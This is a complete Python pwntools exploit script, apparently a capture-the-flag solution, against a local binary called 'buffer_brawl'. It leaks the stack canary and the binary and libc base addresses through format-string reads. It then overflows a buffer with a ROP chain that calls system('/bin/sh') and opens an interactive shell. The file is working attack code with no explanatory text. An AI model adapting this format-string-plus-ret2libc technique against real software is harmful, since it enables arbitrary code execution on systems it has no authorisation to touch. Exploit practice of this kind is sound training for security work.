#!/usr/bin/python3
from pwn import process, p64, u64

shell = process("./buffer_brawl")

shell.sendlineafter(b"> ", b"4")
shell.sendlineafter(b"?\n", b"%11$p.%13$p")

leak = shell.recvline().strip().split(b".")

canary = int(leak[0], 16)
binary_base = int(leak[1], 16) - 0x1747

payload = b"%7$sPWN\x00" + p64(binary_base + 0x3fa0) # puts@got

shell.sendlineafter(b"> ", b"4")
shell.sendlineafter(b"?\n", payload)

libc_base = u64(shell.recvuntil(b"PWN")[:-3].ljust(8, b"\x00")) - 0x80e50

for i in range(29):
    shell.sendlineafter(b"> ", b"3")

offset = 24
junk = b"A" * offset

payload  = b""
payload += junk
payload += p64(canary)
payload += b"B" * 8
payload += p64(libc_base + 0x02a3e5) # pop rdi; ret;
payload += p64(libc_base + 0x1d8678) # "/bin/sh"
payload += p64(libc_base + 0x0f8c92) # ret;
payload += p64(libc_base + 0x050d70) # system()

shell.sendlineafter(b": ", payload)
shell.recvline()
shell.interactive()